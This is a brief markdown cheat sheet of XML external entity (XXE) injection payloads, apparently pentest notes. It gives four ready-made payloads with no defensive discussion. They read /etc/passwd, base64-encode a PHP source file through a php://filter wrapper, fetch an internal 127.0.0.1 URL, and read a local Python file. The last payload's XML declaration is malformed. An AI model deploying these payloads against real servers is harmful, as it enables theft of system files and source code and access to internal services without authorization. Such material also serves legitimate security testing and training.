# XML Injection


### Read etc/passwd without encoding
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<post>
	<poster>vbvebre</poster>
	<content>&xxe;</content>
</post>
```

### Read a file and base64 encode it for display

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY c SYSTEM "php://filter/read=convert.base64-encode/resource=view_order.php">
]>
<order>
    <item>
        <name>&c;</name>
        <amount>14</amount>
    </item>
</order>
```

### Read a file from a URL 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1/secret"> ]>

<post>
	<poster>vbvebre</poster>
	<content>&xxe;</content>
</post>
```


### Read a python file

```xml
<xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:feed.py'>]>
<test>
<Author>&test;</Author>
<Subject>test</Subject>
<Content>test</Content>
</test>
```